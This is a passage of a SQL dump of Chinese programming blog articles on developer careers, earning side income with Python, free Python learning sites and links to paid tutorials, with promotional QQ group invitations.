<p>我想说的是在你决定要入行之前，还是要多多考虑一个问题，那就是兴趣。</p> \n <p>IT行业其实目前来说是一个知识爆炸的领域，基础迭代非常快。我是写java出身的，在此时此刻，如果我不去百度的话，我甚至不敢确定目前java的最新版本是版本号是几点几，发展到哪一步我都是不敢说的。</p> \n <p>你没有足够的兴趣去驱动你去持续学习，我认为你的落伍和被淘汰就只是一个时间问题。</p> \n <p>我大学同班大概是三十个人，到目前为止还在敲代码的可能也就剩四成左右。再说说我的程序员前同事，目前有开网店的、有做美甲的、有卖电子烟的、有开早餐店的、有做销售的。</p> \n <p>这一行的高压和淘汰率，还有所谓的三十五岁魔咒在某些方面是真实存在的。所以个人认为，如果想要打破魔咒在程序员行业待的时间更长久，秘诀只有兴趣。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615195952693.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1bGkxMDI0,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_48\"></a>二、如何从萌新进阶</h2> \n <p>确定要做程序员的话，那么如何可以快速的进步？是选择深度优先还是广度优先？</p> \n <p>许多萌新在刚入行的时候，就面对目前深不见底的技术站都会有一种感觉，第一是不知道从哪学起，第二是又怕学了就顾此失彼。实际上这就是一个深度优先还是广度优先的问题，这也是一个如何高效学习的问题。</p> \n <p>我在这里给大家的建议是，如果你是在刚入行的时候呢，大可以去选择广度优先，就是先把知识面铺开，各种技术蜻蜓点水点一遍，用最小的成本让自己在脑海中构建起来对软件开发的大局观和整体的一种认识。</p> \n <p>有人就说，那你这样学出来是不是那种一瓶充满半瓶子罐油的那种什么都干不好？其实也不是这样，就类比我们上学的时候，小学、初中乃至大学，我们的课程都还是五花八门，均有涉猎的，就是都讲一点，但是都讲得不深。只有到研究生和博士阶段才会选准一个课题，去深度的钻研。</p> \n <p>敲代码也是一样的，就刚入行的时候，我们去优先去拓宽视野，构建这种整体感，先要知道都有些什么技术，每种技术大体是做什么的，我认为这是很重要的，随着我们工作精力的提升，在找准一种到两种的，你自己感兴趣，然后再朝着这个技术去深度的钻研。</p> \n <p>深度和广度都重要，建议广度优先，在广度足够的时候，也要保持至少一个领域的深度。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615200511946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1bGkxMDI0,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"IT_67\"></a>三、IT技术正确的学习方法</h2> \n <p>目前IT行业实在是发展得过于迅猛，新技术层出不穷，老技术又迭代不断。如果你是一个萌新的程序员，你在脑海中还没有对构建起来一种整体感和大局观，这种情况下，我认为直接死磕一门技术的话，风险是非常大的。</p> \n <p>面对新技术的可以直接去找api的目录，快速的了解这项技术是做什么的，能解决什么问题，它的优劣势在哪就够了。你把他的目录印到你的脑海中，在工作中遇到问题，能够第一时间能想到哪种技术能够派到用场，至于具体怎么写、怎么用，现学现卖，先百度就可以，没有必要去把每一行、每一个方法都落实到键盘上，会敲才算会用，那样你可能学的速度都没有人家技术发展的速度快。</p> \n <p>当然不是让大家理解为所有基础都是蜻蜓点水，随便印个目录在脑海中就可以。</p> \n <p>我把程序员分为两派，一派是专业毕业从数据结构开始入门学习的科班生。另一派是直接从项目直接上项目，helloworld开始入门的那种直接速成学的，并不是说后者能力差或者水平低，就是对于后者这种半路出家的程序员来说，建议大家在入职成功之后，一定要找机会、找时间，把一些必知必会的基础知识点补充学习。有以下知识点：</p> \n <p>1.常用数据结构实现原理、优劣势，<br> 2.查找、插入、删除的时间操作复杂度<br> 3.常用算法<br> 4.代码规范</p> \n <p>专业毕业的学生也是从基础内容学起，一般是以<strong>计算机组成原理、计算机操作系统、计算机编译原理、数据结构与算法、计算机网络</strong>这几门课作为基础开始学习。一方面这些计算机基础内容是面试必备，另外一方面你想要在程序员的领域学的更深入一些，这些计算机基础内容完全是必须的。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201702117.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1bGkxMDI0,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_87\"></a>四、避免内卷化</h2> \n <p>我还想再讲一讲这个当前的大环境和内卷。说到内卷啊，这个词可以说是今年的年度热词了，IT行业其实也是走在内卷的最前沿。</p> \n <p>怎样才能避免内卷化？我给出以下几点建议。</p> \n <p>第一：<strong>关注新技术</strong>。IT互联网行业对于新技术是非常敏感的，掌握新技术也意味着会有更多的发展机会，比如当前可以重点关注一下大数据、区块链、人工智能等领域的相关技术，掌握这些技术在工业互联网时代会有一定的发展优势，也有助于自己逃离内卷。</p> \n <p>第二：<strong>提升自身的研发能力</strong>。对于程序员来说，持续提升自身的研发能力是逃离内卷比较现实的办法，而要想提升自身的研发能力，除了可以在开发岗位上进行积累之外，还可以选择读研，当前确实有不少程序员会选择通过读研来提升自己。按照历史经验来看，大部分程序员在读研之后，都获得了岗位升级。</p> \n <p>第三：<strong>重视行业知识的积累</strong>。程序员除了要重视开发技术的提升，还应该重视开发场景的知识积累，也就是所谓的行业知识积累，这一点在工业互联网时代还是非常重要的，更多的行业知识积累也会明显延长自己的职业生命周期。</p> \n <p>最后的最后，如果你已经成为了程序员，或者是立志一定要成为程序员，希望大家能够保持学习，至少以每周为单位，挤出时间来学习，不要安逸的躺在模块开发的大床上昏睡，那样的话你的性价比只能会越来越低。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615201732897.jpg#pic_center\" alt=\"在这里插入图片描述\"><br> 感谢每一位愿意读完我文章的人，对于新媒体创作我也是一个刚入门的，也在不断学习中。<br> 创作是一件非常值得持续投入的事情，因为你们每一次的支持都是对我极大的肯定！<br> 再次感谢大家的支持，在此我整理了一些适合大多数人学习的资料，免费给大家下载领取!<br> 看！干货在这里↓ ↓ ↓</p> \n <ul>\n  <li>2000多本Python电子书。（主流的经典的都包含在内）</li>\n  <li>Python基础入门、爬虫、web开发、大数据分析方面的视频。</li>\n  <li>多个项目及源码。（四五十个有趣且经典的练手项目及源码）</li>\n  <li>经典Python面试题。（面试大厂稳了）</li>\n </ul> \n <p>有需要的读者可以直接拿走，在我的QQ学习交流群（想要找到志同道合的伙伴也可以进群，记住哦仅限学习交流！！！），裙号是：298154825。<br> <img src=\"https://img-blog.csdnimg.cn/20210615201912298.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1bGkxMDI0,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (90, '我用Python空闲时月入10000+方法分享，8000粉丝福利', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>入驻CSDN有很长一段时间了，感谢CSDN平台，让我短时间内涨粉8000，为了回馈这些粉丝，我愿意跟大家分享，我是如何通过Python利用空闲时间月入过万的，每个人的成功都是不可复制的，我不能保证大家看了这篇文章能跟我一样，只希望我这篇文章能帮助到大家，如何利用业余时间去做好副业实现技术变现。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609172928319.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>【上个月的收入】</p> \n <p><img src=\"https://img-blog.csdnimg.cn/2021060916271432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xsYW5kNTIwMTMxNA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"\"></p> \n <h2><a id=\"_12\"></a>说点想说的</h2> \n <p>首先python是一门编程语言，相对来说也是最容易学的编程语言，一门技术，一个技巧性的工作，不管你之前是不是做开发的，只要能找对方式，毕竟不是让你成为这个领域的牛人，至少赚些外快是没有问题的，别一看到就感觉不行，没你想象的那么难。</p> \n <p><em><strong>PS:点赞才能持久收藏可能下架，如果对你有帮助，麻烦点赞三连分享，谢谢支<br> 持</strong></em></p> \n <h2><a id=\"_18\"></a>通过接单赚外快之群接单</h2> \n <p><strong>上手难度:★★★收益:★★</strong></p> \n <p>这种接单方式主要是一些开了某宝店铺的店家，然后会组织一个群，在群内发单由群员接单。也可以通过自己群搜索python代做之类关键词加入，或者去某宝店跟客服说你能接单也会拉你进群。发的代写单有学生的作业、数据分析、爬数据、小企业外包等等。像学生作业(技术难度低)内容较水，报价低(百来块的样子) ,数据爬虫报价高(上千) ,按数据量和难度报价。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609164428196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xsYW5kNTIwMTMxNA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_25\"></a>通过接单赚外快之威客类网站</h2> \n <p><strong>上手难度:★★★收益:★★★</strong></p> \n <p>以下这些需求利用python编程语言是可以搞定的,根据任务难度也有高有低，网站有很多比如猪八戒网、解放号、云沃客、码市、程序员客栈等时间充足赚赚外快，可以自己做一些现成的程序，类似数据分析，类似网站，当有发布对应的单子，直接给现成的程序就行，这样可以提高效率，达到最大化的利益,不是每次都是重复去写。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/2021060916515245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xsYW5kNTIwMTMxNA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"python_32\"></a>通过python赚外快之编程老师</h2> \n <p><strong>上手难度:★★★收益:★★★</strong></p> \n <p>完全可以在一些编程的网站，上传自己的收费录播课程，一份小额的录播课程可以定价在100-500不等，录制一个课程，没有那么难，自己做些精心的准备参考些别人的文章,之前也通过外包磨练了自己的技术了，那么就可以将录制的视频发到像腾讯课堂、网易云课堂、CSDN，头条也有专栏，也是不菲的收入。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609165920305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xsYW5kNTIwMTMxNA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"python_41\"></a>通过python赚外快之其他副业</h2> \n <p><strong>上手难度:★★★收益:★★★</strong></p> \n <p>更多是靠坚持跟积累，同时也需要自己去创新跟研究的所以收益可能高，但是也有可能没有收益，比如通过更新文章,分享学习经验的视频。</p> \n <p>1、公众号,收益接单(一般的媒体平台是可以投放外部广告的，比如头条，如果粉丝量足够,会有人主动联系你)</p> \n <p>2、知乎，赞赏获利(别人看了你的文章之后愿意赞赏你)</p> \n <p>3、b站，1000播放量3.5块钱当然了，自媒体需要积累,前期可能常常是零收益，不断坚持运营，后期的收入还是很客观的以上总结:</p> \n <p>接单: 500元/单<em>4单=2000,一单耗时4小时左右，总16小时。<br> 视频: 100元</em>5单<em>0.5</em> 30天= 7500 (按每天卖5个视频然后除掉平台的百分比)<br> 自媒体: 0.8元/阅读量* 3000 = 2400元(推广)<br> 总计: 11,900<br> <img src=\"https://img-blog.csdnimg.cn/20210609172853480.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><em><strong>PS：不用怀疑数据的真实性，敖丙大神就是通过技术、通过自媒体平台实现财富自由的。可以关+私❤获取</strong></em></p> \n <blockquote> \n  <p>①3000多本Python电子书有<br> ②Python开发环境安装教程有<br> ③Python400集自学视频有<br> ④软件开发常用词汇有<br> ⑤Python学习路线图有<br> ⑥项目源码案例分享有<br> 如果你用得到的话可以直接拿走，在我的QQ技术交流群里（技术交流和资源共享，广告勿<br> 入）可以自助拿走，群号是764406565。</p> \n </blockquote> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (91, '顶级白嫖！！！八个python免费自学网站一周搞定python（抓紧收藏）', '<div id=\"content_views\" class=\"markdown_views prism-tomorrow-night-eighties\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>PS：本文顺序无主次之分纯属我个人排版时候随便的顺序！！！，另外可以把这篇文章分享给身边需要学习的人，帮助别人也是帮自己嘛 嘻嘻而且顺便说一下一周之内基础知识完全可以掌握的，至于能力提升就看自己的方向了。<br> <img src=\"https://img-blog.csdnimg.cn/20210611122620988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"230\"><br> </p> \n <div class=\"toc\"> \n  <h3>资料</h3> \n  <ul>\n   <li><a href=\"#_3\">导读</a></li>\n   <li><a href=\"#1_7\">1.哔哩哔哩</a></li>\n   <li><a href=\"#2CSDN_17\">2.CSDN</a></li>\n   <li><a href=\"#3python_25\">3.python中文官方教程</a></li>\n   <li><a href=\"#4W3school_33\">4.W3school</a></li>\n   <li><a href=\"#5_41\">5.菜鸟教程</a></li>\n   <li><a href=\"#6python3_50\">6.python3简明教程</a></li>\n   <li><a href=\"#7LearnPython_58\">7.LearnPython</a></li>\n   <li><a href=\"#8_66\">8.肥学大师</a></li>\n  </ul> \n </div> \n <p></p> \n <h1><a id=\"_3\"></a>导读</h1> \n <p>人工智能必将到来，在那个时代，我们的工作方式会发生很大的改变，尤其是Python都已经进入了中小学教育的大纲，在智能为主的时代，Python就像现在的电脑一样，每个人工作中必备的工作技能，学会python真的可以解决一些问题，无论在哪些领域（话有些大了）。<br> <img src=\"https://img-blog.csdnimg.cn/20210611130718613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"230\"></p> \n <h1><a id=\"1_7\"></a>1.哔哩哔哩</h1> \n <p>.</p> \n <p>B站相信很多小伙伴都知道，他不仅是动漫，鬼畜，游戏的好地方同时也是一个学习乐园。<br> <img src=\"https://img-blog.csdnimg.cn/20210611123314718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"430\"><br> 我认识很多小伙伴都在这上面学习到了不少的技能可谓是年轻人的天堂。所以也推荐大家想学习python的同学到这里来看看，可能会有意想不到的收获。<br> <img src=\"https://img-blog.csdnimg.cn/20210611123535162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"430\"><br> 链接：<a href=\"https://search.bilibili.com/all?keyword=python%E8%87%AA%E5%AD%A6&amp;from_source=web_search\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"2CSDN_17\"></a>2.CSDN</h1> \n <p>.</p> \n <p>CSDN（Chinese Software Developer Network）肥学作为一名CSDN博主当然也要推荐一下C站了啊 😃 这里有数不尽的大神，各种骚操作，各种新技能让你在学习的海洋里畅游，<mark>简单讲，学python来这里就对了</mark><br> <img src=\"https://img-blog.csdnimg.cn/20210611124059314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"430\"><br> 链接：<a href=\"https://so.csdn.net/so/search?q=python%E8%87%AA%E5%AD%A6&amp;t=&amp;u=\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"3python_25\"></a>3.python中文官方教程</h1> \n <p>.</p> \n <p>来自python官方的教程，<mark>让你学的放心，用的安心</mark>。<br> <img src=\"https://img-blog.csdnimg.cn/20210611124624501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"430\"><br> <img src=\"https://img-blog.csdnimg.cn/20210611124702174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"430\"></p> \n <p>链接：<a href=\"https://docs.python.org/zh-cn/3/tutorial/index.html\">传送门</a></p> \n <h1><a id=\"4W3school_33\"></a>4.W3school</h1> \n <p>.</p> \n <p>很多大佬推荐的一个学习网站里面也有详细的python讲解，和实战，测试也是你不错的选择哦！！，最关键的是所有资源<mark>免费</mark>使用。<br> <img src=\"https://img-blog.csdnimg.cn/20210611124923589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 链接：<a href=\"http://www.w3school.com.cn/\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"5_41\"></a>5.菜鸟教程</h1> \n <p>.</p> \n <p>网站非常适合新手入门！从基础的语法开始，每篇文章都配有实例，而且实例选得很好简单明了，通俗易懂。<br> <img src=\"https://img-blog.csdnimg.cn/20210611125155957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>链接：<a href=\"http://www.runoob.com/\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"6python3_50\"></a>6.python3简明教程</h1> \n <p>.</p> \n <p>这个网站的有一个突出的优点提供了<mark>开箱即用</mark>的实验环境，免去了搭建环境的麻烦。是一个综合的教程，划分了很多不同类别的知识模块，比较偏重实战，作为入门也很不错。<br> <img src=\"https://img-blog.csdnimg.cn/20210611125326326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 链接：<a href=\"https://www.jmjc.tech/tutorial/python/1\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"7LearnPython_58\"></a>7.LearnPython</h1> \n <p>.</p> \n <p>这是一个英文网站，不管是小白还是有经验的程序员，都可以来这个网站学习，他涵盖基本和<mark>高级的python概念</mark>，而且所有的教程都做了有序的分组，很方便。<br> <img src=\"https://img-blog.csdnimg.cn/20210611125609398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 链接：<a href=\"https://www.learnpython.org/\">传送门</a></p> \n <hr> \n <hr> \n <h1><a id=\"8_66\"></a>8.肥学大师</h1> \n <p>.</p> \n <p>这个是开个玩笑<br> <img src=\"https://img-blog.csdnimg.cn/20210611125726717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"230\"><br> 本人计算机学生，目前也在学习中，可以点个关注一起学习呀！！！😃<br> 链接:<a href=\"https://blog.csdn.net/jiahuiandxuehui\">传送门</a></p> \n <p>好了今天的分享就到这里吧，谢谢大家的<mark>三连</mark>（厚着脸要）<br> <img src=\"https://img-blog.csdnimg.cn/20210611130129461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppYWh1aWFuZHh1ZWh1aQ==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\" width=\"230\"></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (92, 'Python实战案例汇总，带你轻松从入门到实战', '<div id=\"content_views\" class=\"htmledit_views\"> \n <p>Python 的火热，不仅让很多小白选手有了想学习的欲望，甚至连 BAT 的技术大牛，也将 Python 作为第二开发语言来提升自己。</p> \n <p></p> \n <p>虽然 Python 以简单易学著称，但是你知道如何快速学会 Python 吗？你知道入门的方法吗？你知道入门 Python 最重要的是什么吗？</p> \n <p></p> \n <p>很多新手急于求成，基础还没学好就去研究爬虫了，甚至连数据处理都不会，就直接去研究神经网络了，因此导致了很多人“从入门到放弃”。</p> \n <p></p> \n <p><strong>其实，一个 Python 程序员的成长路径应该是这样的：</strong></p> \n <p><img alt=\"\" height=\"184\" src=\"https://img-blog.csdnimg.cn/20210619234359737.png\" width=\"780\"></p> \n <p></p> \n <p>万丈高楼平地起，基础打的牢，你的职场发展才会越来越好。</p> \n <p></p> \n <p>今天博主就来为大家推荐几个Python入门、爬虫、数据分析相关的教程，希望能够对你有所帮助。开始阅读之前，我建议你先确定你是否真的要走上Python这条路，如果你的答案是：是的，请继续往下读。</p> \n <p></p> \n <h3>第一、Python入门</h3> \n <p></p> \n <p>我看了这门教程不涵盖Python的任何应用方向，只讲最基础、最核心的内容，无论你之后准备从事什么方向开发，这些内容都是必须要学的，包含了：内置对象和基本的运算、语句等等，基础是学习一门语言最重要的部分，建议你可以跟着这个教程去学。</p> \n <p></p> \n <p><strong>教程传送门：零基础学Python</strong></p> \n <p><strong><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3780\">https://marketing.csdn.net/u/weixin_42350212/e/3780</a></strong></p> \n <p></p> \n <h3>第二、Python爬虫</h3> \n <p></p> \n <p>爬虫现在的招聘需求非常多，即便学了之后不做爬虫工程师，作为兴趣爱好或者副业也是非常好的选择。很多人帮别人爬取数据用来学习，收获也是挺大的。</p> \n <p></p> \n <p>这个教程中将爬虫三要素网络请求、数据解析、数据存储讲解的非常详细，非常适合新手学习。另外在反爬实战上，讲解了几种特定场景下的反爬策略及处理方式。想学爬虫的小伙伴们，可以点击链接了解。</p> \n <p></p> \n <p><img alt=\"\" height=\"612\" src=\"https://img-blog.csdnimg.cn/20210619234406697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"606\"></p> \n <p><strong>教程传送门：150讲轻松搞定Python爬虫</strong></p> \n <p><strong><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3782\">https://marketing.csdn.net/u/weixin_42350212/e/3782</a></strong></p> \n <p></p> \n <p></p> \n <h3>第三、Python自动化</h3> \n <p></p> \n <p>这个方向其实更适合运营、文员等岗位，报表、文档一大堆，学完这个教程可以完成自动整理与生成，各种文件按自己的要求一键自动整理，解放你的生产力。</p> \n <p></p> \n <p>这个教程全程漫画讲解，还是纯干货，号称只讲有用的，文件自动整理、报表文档自动化。听完后你会发现二两老师是一个非常有趣的老师。</p> \n <p></p> \n <p><img alt=\"\" height=\"0\" src=\"https://img-blog.csdnimg.cn/20210619234412615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"0\"><img alt=\"\" height=\"594\" src=\"https://img-blog.csdnimg.cn/20210619234414276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p></p> \n <p><strong>教程地址：零基础Python自动化办公(漫画版)</strong></p> \n <p><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3786\">https://marketing.csdn.net/u/weixin_42350212/e/3786</a></p> \n <p></p> \n <h3><strong>第四、机器学习</strong></h3> \n <p>如果你想从事人工智能行业，那机器学习就是你的必修课，学完这个教程，你将学会哪些知识呢？</p> \n <p></p> \n <p>1、掌握机器学习算法工程师的核心技术，可以面试行业相关工作</p> \n <p>2、掌握独立完成AI任务，可以建立模型去解决生活中很多数据相关问题（合理房屋/商品价格预测、数据分类与降维、图像分割等）</p> \n <p>3、对于需要完成机器学习相关方向毕业设计的同学，你将懂得如何更合理地设计课题、开展项目、实现模型优化；</p> \n <p>4、熟练使用AI工具，更有效地利用AI工具分析数据，帮助自己做决策</p> \n <p></p> \n <p><img alt=\"\" height=\"686\" src=\"https://img-blog.csdnimg.cn/20210619234423354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p></p> \n <p><img alt=\"\" height=\"728\" src=\"https://img-blog.csdnimg.cn/20210619234429768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p></p> \n <p><strong>教程地址：Python3从0入门机器学习算法实战(人工智能必修）</strong></p> \n <p><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3785\">https://marketing.csdn.net/u/weixin_42350212/e/3785</a></p> \n <p></p> \n <h3>第五、数据分析挖掘</h3> \n <p></p> \n <p>数据分析是Python应用较多的一个领域，这个教程包含了Python基础、数据采集、数据处理到数据挖掘，这是我看过比较细致的教程了。</p> \n <p></p> \n <p>主要讲解了4个领域的经典项目，每一个项目都是遵从数据分析的5大步骤，商业目标建立→数据获取→数据预处理→建立模型→模型发布，你可以掌握商业项目的分析方法论。</p> \n <p></p> \n <p><img alt=\"\" height=\"912\" src=\"https://img-blog.csdnimg.cn/2021061923443620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p><img alt=\"\" height=\"912\" src=\"https://img-blog.csdnimg.cn/20210619234441398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"1200\"></p> \n <p></p> \n <p></p> \n <p><strong>教程地址：Python数据分析与挖掘</strong></p> \n <p><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3781\">https://marketing.csdn.net/u/weixin_42350212/e/3781</a></p> \n <p></p> \n <p></p> \n <h3>第六、Python面试</h3> \n <p></p> \n <p>这个教程搜集了各大互联网公司的Python面试题以及类似的题目。包括Python语言本身的知识、Python SDK、Web、Python爬虫以及算法等内容。所以的源代码都使用Python3.x编写。Python相关知识包括基本语法、正则表达式、字符串、数据库、网络、Web等。算法包括了一些出镜率高的内容、如与链表、树、数组相关的算法。称之为Python面试全集也无可厚非。</p> \n <p></p> \n <p><img alt=\"\" height=\"872\" src=\"https://img-blog.csdnimg.cn/202106192344460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"854\"></p> \n <p></p> \n <p></p> \n <p><strong>教程地址：Python 面试100讲（基于Python3.x）</strong></p> \n <p><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3790\">https://marketing.csdn.net/u/weixin_42350212/e/3790</a></p> \n <p></p> \n <h3>第七、技术问题</h3> \n <p></p> \n 